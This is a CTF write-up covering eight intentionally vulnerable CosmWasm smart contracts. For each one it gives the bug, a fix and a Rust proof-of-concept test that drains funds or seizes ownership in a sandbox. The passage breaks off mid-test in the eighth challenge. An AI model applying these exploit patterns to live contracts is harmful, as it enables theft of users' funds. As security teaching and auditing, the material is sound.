# Oak Security CTF Submission

## Challenge 01: *Mjolnir*

### Description

#### Severity: $\textcolor{red}{\textsf{Critical}}$ 

There is a vunerability in this contract on line 84 of `contract.rs`, inside the `withdraw` function. 

The vunerability can be seen here:
```rust
    // fetch vaults to process
    // VUNERABILITY: There is no check for duplicate IDs in the message from the user
    // A user can pass in [2, 2, 2...] and drain all of the contracts funds
    for lockup_id in ids.clone() {
        let lockup = LOCKUPS.load(deps.storage, lockup_id).unwrap();
        lockups.push(lockup);
    }
```

The problem is that there is no check for duplicate IDs. A malicious user can do the following to drain all of the contracts funds:
1) The user creates a new lockup via `ExecuteMsg::Deposit {}`
    - This lockup can contain the minimum amount of tokens allowed by the contract
2) The user waits the required lockup period
3) **The user queries the contract to check how many tokens it holds**
4) **The user calls the contract with `ExecuteMsg::Withdraw {ids: vec![x; n]}`**
    - Where `x` is the id of their Lockup from step 1, and
    - Where `n` is the maximum amount of times their Lockup amount from step 1 goes into the amount of funds the contract holds 

### Recommendation

A simple fix for this would be using a `BTreeSet` to remove all duplicate IDs in the user's withdraw method. 

For example, filtering out duplicate IDs with a BTreeSet:
```rust
    // Mapping to a BTreeSet will remove duplicate values for you (you also get them back sorted :D)
    let filtered_ids = ids
        .iter()
        .map(|id| *id)
        .collect::<std::collections::BTreeSet<u64>>();

    for lockup_id in filtered_ids.clone() {
        let lockup = LOCKUPS.load(deps.storage, lockup_id).unwrap();
        lockups.push(lockup);
    }
```


### Proof of concept

`integration_tests.rs` line 110
```rust
    #[test]
    fn theres_so_many() {
        // "user" now has a lockup with id of 1 and amount of Uint128(10000)
        let (mut app, contract_addr) = proper_instantiate();

        // create "hacker"
        let hacker = Addr::unchecked("hacker");
        // mint "hacker" Uint128(10000) coins
        app = mint_tokens(app, hacker.to_string().clone(), Uint128::from(10000u128));
        // "hacker" creates a lockup with their coins (id of 2)
        app.execute_contract(
            hacker.clone(),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(MINIMUM_DEPOSIT_AMOUNT.u128(), DENOM)],
        )
        .unwrap();

        // Verify hacker has no funds
        let hacker_balance = app.wrap().query_balance(hacker.to_string(), DENOM).unwrap().amount;
        assert_eq!(hacker_balance, Uint128::zero());

        // Verify lockup exists
        let hacker_lockup: Lockup = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::GetLockup { id: 2 })
            .unwrap();
        assert_eq!(hacker_lockup.amount, MINIMUM_DEPOSIT_AMOUNT);
        assert_eq!(hacker_lockup.owner, hacker);

        // fast forward 24 hrs
        app.update_block(|block| {
            block.time = block.time.plus_seconds(LOCK_PERIOD);
        });

        //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ EXPLOIT HERE
        // Notice the duplicate ids in Withdraw message
        // 1 for the funds the hacker deposited,
        // 1 for the funds the non-malicious user deposited
        // 10 for the rest of the funds the contract has
        app.execute_contract(
            hacker.clone(),
            contract_addr.clone(),
            &ExecuteMsg::Withdraw { ids: vec![2; 12] },
            &[]
        ).unwrap();

        // Verify hacker has drained contract
        let hacker_balance = app.wrap().query_balance(hacker.to_string(), DENOM).unwrap().amount;
        assert_eq!(hacker_balance, Uint128::from(120000u128));

        // Verify contract has no funds
        let contract_balance = app.wrap().query_balance(contract_addr.to_string(), DENOM).unwrap().amount;
        assert_eq!(contract_balance, Uint128::zero());
    }
```

---

## Challenge 02: *Gungnir*

### Description

#### Severity: $\textcolor{red}{\textsf{Critical}}$

There is a vunerability in this contract regarding invalid overflow checks. 

If you write a simple test (see **Proof of concept**) where, for example, a user tries to unstake more tokens than they have staked, and then you run `cargo test`, the test will throw an error like you would expect.

However, if you run the same test in release mode via `cargo test --release`, you'll notice that no error is thrown.

After running this test with `--release` and checking the user's `voting_power`, you'll see that they now have a `voting_power` of 
```
u128::MAX - abs(staked - unstaking) + 1
```
So if a user has `1000` tokens staked, they can call the Unstake method with `unlock_amount: 1001` and increase their voting power to `u128::MAX`


### Recommendation

#### **1)** Set `overflow-checks` to true in `cargo.toml`
```toml
# line 21
[profile.release]
#...
overflow-checks = true
```
You can also create a `[profile.test]` section in `cargo.toml` and set it there, if you don't want to include overflow checks in your production builds
```toml
[profile.test]
overflow-checks = true
```

#### **2)** Replace all usage of unchecked arithmetic
Ex: `contract.rs` line 137

Replace this:
```rust
    let mut user: UserInfo = VOTING_POWER.load(deps.storage, &info.sender).unwrap();

    //...

    user.voting_power -= unlock_amount;
```

With something like this:
```rust
    let mut user: UserInfo = VOTING_POWER.load(deps.storage, &info.sender).unwrap();

    //...

    let new_voting_power = user.voting_power
        .checked_sub(unlock_amount)
        .ok_or_else(|| ContractError::Unauthorized {  })?;

    user.voting_power = new_voting_power;
```

### Proof of concept

```rust
    #[test]
    fn runneth_under() {
        let (mut app, contract_addr) = proper_instantiate();

        // Create "hacker"
        let hacker = Addr::unchecked("hacker");

        // Give hacker 1000 tokens
        app = mint_tokens(app, hacker.to_string(), Uint128::from(1000u128));

        // Hacker deposits 1000 tokens
        let msg = ExecuteMsg::Deposit {};
        app.execute_contract(
            hacker.clone(),
            contract_addr.clone(),
            &msg,
            &[coin(1000u128, DENOM)],
        )
        .unwrap();

        // Hacker has 0 tokens left
        let balance = app.wrap().query_balance("hacker", DENOM).unwrap().amount;
        assert_eq!(balance, Uint128::zero());

        // Hacker has 1000 tokens deposited 
        let msg = QueryMsg::GetUser {
            user: "hacker".to_string(),
        };
        let user: UserInfo = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        assert_eq!(user.total_tokens, Uint128::from(1000u128));

        // Hacker stakes 1000 tokens
        let ex_msg = r#"{"stake":{"lock_amount":"1000"}}"#;
        let msg: schemars::_serde_json::Value = schemars::_serde_json::from_str(ex_msg).unwrap();
        app.execute_contract(hacker.clone(), contract_addr.clone(), &msg, &[])
            .unwrap();

        // Verify 1000 tokens were staked
        let msg = QueryMsg::GetUser { 
            user: "hacker".to_string()
        };
        let user_info: UserInfo = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        assert_eq!(user_info.voting_power, 1000u128);
        assert_eq!(user_info.total_tokens, Uint128::from(1000u128));

        // fast forward time
        app.update_block(|block| {
            block.time = block.time.plus_seconds(LOCK_PERIOD);
        });

        // Hacker unstakes 1001
        let ex_msg = r#"{"unstake":{"unlock_amount":"1001"}}"#;
        let msg: schemars::_serde_json::Value = schemars::_serde_json::from_str(ex_msg).unwrap();
        app
            .execute_contract(Addr::unchecked("hacker"), contract_addr.clone(), &msg, &[])
            .unwrap();

        // Check Hacker's info after trying to unstake 1001 tokens with only 1000 staked
        let msg = QueryMsg::GetUser {
            user: "hacker".to_string(),
        };
        let user_info: UserInfo = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        
        // This is good!
        assert_eq!(user_info.total_tokens, Uint128::from(1000u128));
        // This is not!
        assert_eq!(user_info.voting_power, 340282366920938463463374607431768211455u128);
    }
```

---

## Challenge 03: *Laevateinn*

### Description

#### Severity: $\textcolor{aqua}{\textsf{Informational}}$

There is an exploitable bug in this contract due to a dependency on a modified `cw-multi-test` library (which is a great reminder to always check dependencies) 

While this PoC is *unlikely* to be viable in a live environment, it does render the contract vulnerable during tests in this sandboxed setting.

Note that this bug **was** exploitable in live environments prior to [CWA-2022-002](https://github.com/CosmWasm/advisories/blob/979c849f8d7d069b18b950054a84dea7c421a493/CWAs/CWA-2022-002.md?plain=1#L28)

The exploit allows a user to bypass the following check within the `request_flash_loan` function in `/proxy/src/contract.rs`, by passing the `flash_loan_addr` converted to upper-case in the `recipient` field:
```rust
    if recipient == config.flash_loan_addr {
        return Err(ContractError::CallToFlashLoan {});
    }
```
While the check above does not return an error (because Rust recognizes that `"CONTRACT" != "contract"`), in both this sandboxed environment and prior to CWA-2022-002, the cosmwasm-vm *did* recognize "CONTRACT" as being equivalent to "contract"

So that means that this check can be bypassed and a message can be sent to the `flash_loan` contract, which is the core of this PoC 

An example of the exploit process:
- The `flash_loan` contract is instantiated with an example address of `contract0`, and the `proxy` contract is instantiated with an example address of `contract1`
- **Note** that the `proxy` contract has elevated permissions on the `flash_loan` contract. Among other things, `proxy` is able to set a new `OWNER` on `flash_loan`, and `OWNER` is able to withdraw all funds from `flash_loan` 
- `USER` calls the `ExecuteMsg::RequestFlashLoan` entry point on the `proxy` contract with `recipient: "CONTRACT0"`, and a `msg` that sets themselves as the new `OWNER` of `flash_loan`
```rust
pub enum ExecuteMsg {
    RequestFlashLoan {
        recipient: Addr, 
        msg: Binary 
    },
}

let msg_binary: Binary = to_binary(&FlashLoanExecuteMsg::TransferOwner {
    new_owner: Addr::unchecked("hacker")
}).unwrap();

let make_me_owner = ExecuteMsg::RequestFlashLoan {
    recipient: Addr::unchecked("CONTRACT0"),
    msg: msg_binary
}
```
- Once they are the owner of the `flash_loan` contract they can pretty much do whatever they want, including calling the `WithdrawFunds` method, draining the entire balance of `flash_loan`


### Recommendation

1) Always verify your dependencies (especially in a CTF hackathon :wink:)

2) Replace the modified `cw-multi-test` library with the actual [cw-multi-test](https://github.com/CosmWasm/cw-multi-test)


### Proof of concept

`/proxy/src/integration_tests.rs`
```rust
    // /proxy/
    #[test]
    fn i_am_captain_now() {
        let (mut app, proxy_contract, flash_loan_contract, _mock_arb_contract) =
            proper_instantiate();

        // You cannot call flash loan address from proxy...
        app.execute_contract(
            Addr::unchecked(ADMIN),
            proxy_contract.clone(),
            &ExecuteMsg::RequestFlashLoan {
                recipient: flash_loan_contract.clone(),
                msg: to_binary(&MockArbExecuteMsg::Arbitrage {
                    recipient: flash_loan_contract.clone(),
                }).unwrap(),
            },
            &[],
        ).unwrap_err();

        // ...unless you convert the flash loan contract address to uppercase first,
        // bypassing the recipient address check via uppercase conversion
        app.execute_contract(
            Addr::unchecked("hacker"),
            proxy_contract.clone(),
            &ExecuteMsg::RequestFlashLoan {
                recipient: Addr::unchecked(flash_loan_contract.clone().to_string().to_ascii_uppercase()),
                msg: to_binary(&FlashLoanExecuteMsg::TransferOwner { 
                    new_owner: Addr::unchecked("hacker")
                }).unwrap(),
            },
            &[],
        )
        .unwrap();

        // "hacker" has no balance
        let balance = app
            .wrap()
            .query_balance("hacker".to_string(), DENOM)
            .unwrap();
        assert_eq!(balance.amount, Uint128::new(0));

        // "hacker" takes all funds from flash loan contract
        app.execute_contract(
            Addr::unchecked("hacker"),
            flash_loan_contract.clone(),
            &FlashLoanExecuteMsg::WithdrawFunds { 
                recipient: Addr::unchecked("hacker")
            },
            &[],
        )
        .unwrap();

        // "hacker" has successfully drained the flash loan contract
        let balance = app
            .wrap()
            .query_balance("hacker".to_string(), DENOM)
            .unwrap();
        assert_eq!(balance.amount, Uint128::new(10_000));
    }

```

---

## Challenge 04: *Gram*

### Description

#### Severity: $\textcolor{red}{\textsf{Critical}}$

There is a vulnerability in this contract in that a malicious user can send tokens directly to the contract (without calling `Mint`) before any shares are minted. Then, when they do mint shares, they have essentially "pre-diluted" other holders. By doing this, the exploiter can wait until other users have called the `Mint` function, and then burn their own shares to effectively steal the other users funds.

This bug exists because of how the `total_assets` for the contract is calculated. It currently queries itself to determine what it's balance is, allowing the malicious user to exploit the scenario described above. That piece of code can be seen here inside the `mint` function:
```rust
    let contract_balance = deps
        .querier
        .query_balance(env.contract.address.to_string(), DENOM)
        .unwrap();

    let total_assets = contract_balance.amount - amount;
```

### Recommendation

My recommendation would be to keep track of Contract's **relevant** balance, meaning it's balance that is relevant to the Minting/Burning of shares. That way, an exploiter cannot skew the share calculations by sending untracked tokens directly to the contract.

For example, you could add this to the contract's `Config` state:
```rust
#[cw_serde]
pub struct Config {
    pub total_supply: Uint128,
    // add this line
    pub total_balance: Uint128
}
```
Then read from/update this amount instead of having the contract query itself directly
```rust
    // replace this
    let contract_balance = deps
        .querier
        .query_balance(env.contract.address.to_string(), DENOM)
        .unwrap();
    
    // with this
    let contract_balance = CONFIG.load(deps.storage).unwrap().total_balance;
```
I'd also recommend replacing all unchecked arithmetic with their checked alternatives.

### Proof of concept

```rust
    // This demonstrates how an unprivileged user can withdraw more funds than deposited
    #[test]
    fn left_unchecked() {
        let (mut app, contract_addr) = proper_instantiate();

        // mint 10_000 tokens to both users
        app = mint_tokens(app, USER.to_owned(), Uint128::new(10_000));
        app = mint_tokens(app, USER2.to_owned(), Uint128::new(10_000));

        // USER sends 5_000 tokens directly to the contract "pre-diluting" other users
        let msg: cosmwasm_std::CosmosMsg = cosmwasm_std::BankMsg::Send {
            to_address: contract_addr.clone().into(),
            amount: vec![coin(5_000, DENOM)],
        }
        .into();
        app.execute(Addr::unchecked(USER), msg.clone()).unwrap();

        // USER calls mint with 10 tokens
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[coin(10, DENOM)],
        )
        .unwrap();

        // USER2 calls mint with 10_000 tokens
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        // Querying the contract to get the number of shares USER owns
        let balance: Balance = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::UserBalance {
                    address: USER.to_string(),
                },
            )
            .unwrap();
        
        // Assert it's 10 (the same amount they called Mint with)
        assert_eq!(balance.amount, Uint128::from(10u128));

        // USER calls burn, burning all 10 of their shares
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::Burn {
                shares: balance.amount
            },
            &[],
        )
        .unwrap();

        // Asserting that "USER" has successfully stolen tokens from other users
        // Asserting that "USER" has withdrawn more funds than deposited
        let user_bal = app.wrap().query_balance(USER, DENOM).unwrap();
        assert!(user_bal.amount.u128() > 10_000u128);
        assert_eq!(user_bal.amount, Uint128::from(10_165u128));
    }

```

---

## Challenge 05: *Draupnir*

### Description

#### Severity: $\textcolor{red}{\textsf{Critical}}$

There is a vulnerability in this contract in the `accept_owner` function, specifically on line 129 of `contract.rs`. This is the code on line 129:
```rust
    if state.proposed_owner != Some(info.sender.clone()) {
        ContractError::Unauthorized {};
    }
```

The problem is that the `ContractError::Unauthorized {}` isn't actually returned. This allows any address to call the `AcceptOwner` execute method and make themselves the new owner of the contract.

### Recommendation

This can be fixed by adding a return statement inside the check above, like this:
```rust
    if state.proposed_owner != Some(info.sender.clone()) {
        return Err(ContractError::Unauthorized {});
    }
```

### Proof of concept

```rust
    #[test]
    fn expressive_lesson() {
        use cosmwasm_std::{CosmosMsg, BankMsg};
        let (mut app, contract_addr) = proper_instantiate();

        // Initial state
        let state: State = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::State {})
            .unwrap();

        assert_eq!(
            state,
            State {
                current_owner: Addr::unchecked(ADMIN),
                proposed_owner: None,
            }
        );

        // User 1 deposit
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        // User 2 deposit
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(8_000, DENOM)],
        )
        .unwrap();

        // Admin wants to give new_owner role to "new_owner"
        app.execute_contract(
            Addr::unchecked(ADMIN),
            contract_addr.clone(),
            &ExecuteMsg::ProposeNewOwner {
                new_owner: "new_owner".to_string(),
            },
            &[],
        )
        .unwrap();

        // "hacker" swoops in and accepts the role instead
        app.execute_contract(
            Addr::unchecked("hacker"),
            contract_addr.clone(),
            &ExecuteMsg::AcceptOwnership {},
            &[],
        )
        .unwrap();
        
        // Verify that "hacker" is the new owner of the contract
        let state: State = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::State {})
            .unwrap();

        assert_eq!(
            state,
            State {
                current_owner: Addr::unchecked("hacker"),
                proposed_owner: None,
            }
        );

        // Get balance of contract
        let old_contract_bal = app.wrap().query_balance(contract_addr.clone(), DENOM).unwrap();

        // "hacker" sending all tokens to themselves
        let steal_funds_msg: CosmosMsg = CosmosMsg::Bank(BankMsg::Send { 
            to_address: "hacker".to_string(), 
            amount: vec![coin(old_contract_bal.amount.u128(), DENOM)]
        });

        app.execute_contract(
            Addr::unchecked("hacker"),
            contract_addr.clone(),
            &ExecuteMsg::OwnerAction { msg: steal_funds_msg },
            &[]
        ).unwrap();

        // Assert contract now has no tokens
        let new_contract_bal = app.wrap().query_balance(contract_addr.clone(), DENOM).unwrap();
        assert_eq!(new_contract_bal.amount, Uint128::zero());

        // Assert "hacker" has received all the tokens
        let hacker_bal = app.wrap().query_balance(Addr::unchecked("hacker").clone(), DENOM).unwrap();
        assert_eq!(hacker_bal.amount, old_contract_bal.amount);
    }
```

---

## Challenge 06: *Hofund*

### Description

#### Severity: $\textcolor{orange}{\textsf{Major}}$

There is a vunerability in this contract which allows votes on previous proposals to be "carried over" as votes in future proposals. The scenario this proof of concept exploits is the following:

- `proposal_1` is submitted to make `USER1` the new owner of the contract
- `proposal_1` does not get enough votes (30% of token supply required)
- `proposal_1` is resolved and does not pass. It is removed from storage, and a new proposal can be made
- `proposal_2` is submitted to make `USER2` the new owner of the contract
- `proposal_2` does not need to get votes >= 30% of token supply, it only needs to make up the difference between the votes on the `proposal_1` and 30% of token supply. **(Because the contract still owns all of the tokens used to vote on `proposal_1`)**
- `proposal_2` can be passed by `USER2` as long as they have > (30% of token supply - tokens used to vote on `proposal_1`)
- `USER2` successfully "piggy backs" the votes on `proposal_1` to exploit the contract and make themselves the new owner
- `USER2` can now execute arbitrary messages like drain the contracts funds etc.


### Recommendation

1) Keep track of CW20 tokens used to vote, instead of querying the contract's balance at the time of proposal resolution. You could modify the contract to something like this:

*In `state.rs`*
```rust
// NOTE: This is just a simple example
// Create a Map that keeps tracks of tokens sent to the contract
// Key = The user that voted
// Value = The amount they voted with
pub const VOTES: Map<&Addr, Uint128> = Map::new("votes");
// And an Item that keeps tracks of cumulative votes
pub const TOTAL_VOTES: Item<Uint128> = Item::new("total_votes");
```
*In `contract.rs`*
```rust
/// Entry point when receiving CW20 tokens
pub fn receive_cw20(
    deps: DepsMut,
    env: Env,
    info: MessageInfo,
    cw20_msg: Cw20ReceiveMsg,
) -> Result<Response, ContractError> {
    let config = CONFIG.load(deps.storage)?;
    let current_proposal = PROPOSAL.load(deps.storage)?;

    // Verify the correct token address
    if config.voting_token != info.sender {
        return Err(ContractError::Unauthorized {});
    }

    // Do any other checks you need, like voting window etc
    // ...

    // We probably want to keep track of all the tokens received, regardless of the message sent. If you had other messages you could include a match statement and modify the logic to your needs
    let _x = from_binary(&cw20_msg.msg)?;

    // this is the user who sent the tokens
    let sender = deps.api.addr_validate(&cw20_msg.sender)?;
    // this is the amount of tokens they sent
    let amount = cw20_msg.amount;

    // If sender has already voted return an error
    if VOTES.load(deps.storage, &sender).is_ok() {
        return Err(ContractError::AlreadyVoted {});
    }

    // Otherwise, add this vote to the map
    VOTES.save(
        &deps.storage,
        &sender,
        &amount
    )?;

    // And update the TOTAL_VOTES count
    TOTAL_VOTES.update(&deps.storage, |mut old| -> StdResult<_> {
        let new = old.checked_add(amount)?;
        Ok(new)
    })?;

    // The rest of your logic and returning a response
    // ...

}

```

2) Now that you have saved both **The total amount of votes** and **Each user's vote**, you can 
- Use the total amount of votes to determine whether or not a proposal has passed
- Send users their CW20 tokens back once a proposal has been resolved 

### Proof of concept

```rust
    #[test]
    fn gone_but_not_forgotten() {
        // ADMIN has 100_000 tokens
        // USER1 has 10_000 tokens
        // USER2 has 10_000 tokens
        let (mut app, contract_addr, token_addr) = proper_instantiate();

        // User1 propose themselves
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Propose {},
            &[],
        )
        .unwrap();

        // Admin votes, but not enough to pass the proposal
        let msg = to_binary(&Cw20HookMsg::CastVote {}).unwrap();
        app.execute_contract(
            Addr::unchecked(ADMIN),
            token_addr.clone(),
            &Cw20ExecuteMsg::Send {
                contract: contract_addr.to_string(),
                msg,
                amount: Uint128::new(39_000)
            },
            &[],
        )
        .unwrap();

        // fast forward 24 hrs
        app.update_block(|block| {
            block.time = block.time.plus_seconds(VOTING_WINDOW);
        });

        // User1 ends proposal
        let result = app
            .execute_contract(
                Addr::unchecked(USER1),
                contract_addr.clone(),
                &ExecuteMsg::ResolveProposal {},
                &[],
            )
            .unwrap();

        assert_eq!(result.events[1].attributes[2], attr("result", "Failed"));

        // ownership has not changed
        let config: Config = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Config {})
            .unwrap();
        assert_eq!(config.owner, "admin".to_string());


        // Note that the contract -still- has 39_000 of the token supply (out of a total 120_000)
        // So let's try creating another proposal

        // USER2 creates a proposal which will make themselves the owner
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Propose {},
            &[],
        )
        .unwrap();

        // USER2 votes for the proposal, but only has 10_000 tokens to vote with 
        // (out of 120_000 total tokens, so USER2 only has 8.3% of total supply)
        let msg = to_binary(&Cw20HookMsg::CastVote {}).unwrap();
        app.execute_contract(
            Addr::unchecked(USER2),
            token_addr,
            &Cw20ExecuteMsg::Send {
                contract: contract_addr.to_string(),
                msg,
                amount: Uint128::new(10_000)
            },
            &[],
        )
        .unwrap();

        // fast forward 24 hrs
        app.update_block(|block| {
            block.time = block.time.plus_seconds(VOTING_WINDOW);
        });

        // USER2 ends proposal
        let result = app
            .execute_contract(
                Addr::unchecked(USER2),
                contract_addr.clone(),
                &ExecuteMsg::ResolveProposal {},
                &[],
            )
            .unwrap();

        assert_eq!(result.events[1].attributes[2], attr("result", "Passed"));

        // Verify that USER2 is now the owner of the contract, despite only having 10_000 tokens (8.3%) to vote with
        let config: Config = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Config {})
            .unwrap();
        assert_eq!(config.owner, USER2.to_string());
    }
```

---

## Challenge 07: *Tyrfing*

### Description

#### Severity: $\textcolor{red}{\textsf{Critical}}$

There is a vunerability in this contract that both `TOP_DEPOSITOR` and `OWNER` use the same key name of `"address"` (key collision), as shown here:
```rust
pub const TOP_DEPOSITOR: Item<Addr> = Item::new("address");

pub const OWNER: Item<Addr> = Item::new("address");
```

This is a big problem, because anytime you read from/write to either of them, you are pointing at the same storage. Writing to one of them will overwrite the other, and vice versa.

In regards to this contract, when the `TOP_DEPOSITOR` is changed via the `ExecuteMsg::Deposit` method, **it will also overwrite the `OWNER` storage entry**, effectively making the top depositor *also* the owner of the contract.

### Recommendation

A simple fix for this would be changing both keys to something more fitting, like this:
```rust
pub const TOP_DEPOSITOR: Item<Addr> = Item::new("top_depositor");

pub const OWNER: Item<Addr> = Item::new("owner");
```

I'd also recommend moving `TOP_DEPOSITOR` to `state.rs` with the rest of the contract's state as well

### Proof of concept

```rust
    #[test]
    fn all_your_base() {
        let (mut app, contract_addr) = proper_instantiate();

        // give "hacker" 1_001 tokens and "grug" 1_000 tokens
        app = mint_tokens(app, "hacker".to_string(), Uint128::from(1_001u128));
        app = mint_tokens(app, "grug".to_string(), Uint128::from(1_000u128));

        // Verify that "admin" is contract owner to start
        let config: crate::msg::ConfigQueryResponse = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Config {})
            .unwrap();
        assert_eq!(config.owner, Addr::unchecked("admin"));

        // "grug" deposits 1_000 tokens
        app.execute_contract(
            Addr::unchecked("grug"),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(1_000, DENOM)],
        )
        .unwrap();
        let grug_bal = app.wrap().query_balance("grug", DENOM).unwrap();
        assert_eq!(grug_bal.amount, Uint128::zero());

        // "hacker" deposits 1_001 tokens, is now "TOP_DEPOSITOR"
        app.execute_contract(
            Addr::unchecked("hacker"),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(1_001, DENOM)],
        )
        .unwrap();
        let hacker_bal = app.wrap().query_balance("hacker", DENOM).unwrap();
        assert_eq!(hacker_bal.amount, Uint128::zero());

        // Query top depositor
        let top: Addr = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Top {})
            .unwrap();
        assert_eq!(top, Addr::unchecked("hacker"));

        // But "TOP_DEPOSITOR" and "OWNER" are both stored under the same key namespace of "address"
        let config: crate::msg::ConfigQueryResponse = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Config {})
            .unwrap();
        assert_eq!(config.owner, Addr::unchecked("hacker"));

        // that's not good...
        // "hacker" queries balance of contract and sends themselves all the tokens
        let contract_bal = app.wrap().query_balance(contract_addr.clone(), DENOM).unwrap();
        let steal_funds_msg: cosmwasm_std::CosmosMsg = cosmwasm_std::CosmosMsg::Bank(cosmwasm_std::BankMsg::Send { 
            to_address: "hacker".to_string(), 
            amount: vec![coin(contract_bal.amount.u128(), DENOM)]
        });
        app.execute_contract(
            Addr::unchecked("hacker"),
            contract_addr.clone(),
            &ExecuteMsg::OwnerAction { 
                msg: steal_funds_msg
            },
            &[],
        )
        .unwrap();

        // Assert that hacker now has 2_001 tokens
        let hacker_bal = app.wrap().query_balance("hacker", DENOM).unwrap();
        assert_eq!(hacker_bal.amount, Uint128::new(2_001));

        // Assert that contract has none
        let contract_bal = app.wrap().query_balance(contract_addr.clone(), DENOM).unwrap();
        assert_eq!(contract_bal.amount, Uint128::zero());
    }
```

---

## Challenge 08: *Gjallarhorn*

### Description

#### Severity: $\textcolor{red}{\textsf{Critical}}$

There is a vulnerability in this contract caused by the inadequate usage of `SubMsg::reply_always`. SubMsgs with `reply_always` make no assumptions about whether the message succeeded or failed, meaning that even if the message execution fails, the transaction will not be reverted.

In this contract, that becomes a problem in the following scenario (shown in the Proof of Concept)
- `USER1` creates an approval for the contract to spend `NFT1`

- `USER2` creates an approval for the contract to spend `NFT2`

- `USER2` creates a trade offer, offering `NFT2` in exchange for `NFT1`

- `USER2` immediately revokes the contract's approval to spend `NFT2`. `USER2` now owns `NFT2` again and the swap contract cannot transfer it

- `USER1` accepts the trade, thinking they will get `NFT2` in exchange for their `NFT1`

- `NFT1` is sent to `USER2`, but when the swap contract tries to send `NFT2` to `USER1`, the execution fails because the swap contract no longer has an approval to send the NFT

- Because of the usage of `SubMsg::reply_always`, the first message (`NFT1` -> `USER2`) is not reverted due to the failure of the second message (`NFT2` -> `USER1`)

- `USER2` now owns both `NFT1` and `NFT2`, and `USER1` got scammed

### Recommendation

Replacing the usage of `SubMsg::reply_always` with `SubMsg::reply_on_success` within the `exec_accept_trade` function on line 241 of `contract.rs` will fix the vulnerability described above

*Replace this:*
```rust
    // Asked
    let mut submsgs = vec![SubMsg::reply_always(
        WasmMsg::Execute {
            contract_addr: config.nft_contract.to_string(),
            msg: to_binary(&Cw721ExecuteMsg::TransferNft {
                recipient: trade.trader.to_string(),
                token_id: trade.asked_id.clone(),
            })?,
            funds: vec![],
        },
        TRADE_REPLY,
    )];

    // Offered
    submsgs.push(SubMsg::reply_always(
        WasmMsg::Execute {
            contract_addr: config.nft_contract.to_string(),
            msg: to_binary(&Cw721ExecuteMsg::TransferNft {
                recipient: sale.owner.to_string(),
                token_id: trade.to_trade_id.clone(),
            })?,
            funds: vec![],
        },
        TRADE_REPLY,
    ));
```

*With this:*
```rust
    // Asked
    let mut submsgs = vec![SubMsg::reply_on_success(
        WasmMsg::Execute {
            contract_addr: config.nft_contract.to_string(),
            msg: to_binary(&Cw721ExecuteMsg::TransferNft {
                recipient: trade.trader.to_string(),
                token_id: trade.asked_id.clone(),
            })?,
            funds: vec![],
        },
        TRADE_REPLY,
    )];

    // Offered
    submsgs.push(SubMsg::reply_on_success(
        WasmMsg::Execute {
            contract_addr: config.nft_contract.to_string(),
            msg: to_binary(&Cw721ExecuteMsg::TransferNft {
                recipient: sale.owner.to_string(),
                token_id: trade.to_trade_id.clone(),
            })?,
            funds: vec![],
        },
        TRADE_REPLY,
    ));
```

### Proof of concept

```rust
    #[test]
    fn buy_one_get_one() {
        let (mut app, contract_addr, token_addr) = proper_instantiate();

        // Approve to transfer the NFT
        app.execute_contract(
            Addr::unchecked(USER1),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
                spender: contract_addr.to_string(),
                token_id: NFT1.to_string(),
                expires: None,
            },
            &[],
        )
        .unwrap();

        // Create a new sale
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::NewSale {
                id: NFT1.to_string(),
                price: Uint128::from(100u128),
                tradable: true,
            },
            &[],
        )
        .unwrap();

        let sale_info: Sale = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::GetSale {
                    id: NFT1.to_string(),
                },
            )
            .unwrap();
        assert_eq!(sale_info.owner, USER1.to_string());

        // Approve to transfer the NFT
        app.execute_contract(
            Addr::unchecked(USER2),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
                spender: contract_addr.to_string(),
                token_id: NFT2.to_string(),
                expires: None,
            },
            &[],
        )
        .unwrap();

        // Create trade offer
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::NewTrade {
                target: NFT1.to_string(),
                offered: NFT2.to_string(),
            },
            &[],
        )
        .unwrap();

        let owner_of: Trade = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::GetTrade {
                    id: NFT1.to_string(),
                    trader: USER2.to_string(),
                },
            )
            .unwrap();
        assert_eq!(owner_of.trader, USER2.to_string());

        //USER2 revokes approval for NFT2
        let revoke_msg = cw721_base::msg::ExecuteMsg::Revoke::<Empty, Empty> { 
